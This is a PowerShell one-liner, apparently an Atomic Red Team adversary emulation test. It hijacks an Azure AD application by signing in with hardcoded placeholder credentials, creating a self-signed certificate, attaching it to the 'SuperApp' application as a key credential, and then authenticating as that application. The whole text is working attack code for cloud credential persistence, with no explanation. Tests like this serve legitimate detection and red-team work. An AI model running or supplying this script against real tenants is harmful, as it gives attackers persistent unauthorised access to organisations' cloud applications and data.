Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String "p4sswd" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "jonh@contoso.com", $Pword; Connect-AzureAD -Credential $Credential > $null; $app = Get-AzureADApplication -SearchString "SuperApp" | Select-Object -First 1; if ($app -eq $null) { Write-Warning "Application not found"; exit }; $credNotAfter = (Get-Date).AddDays(1); $certNotAfter = (Get-Date).AddDays(2); $cert = New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter; $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData()); Write-Host "Generated certificate ""$($cert.Thumbprint)"""; New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter; Start-Sleep -s 30; $tenant = Get-AzureADTenantDetail; $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint; Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)"; Write-Host "End of Hijacking"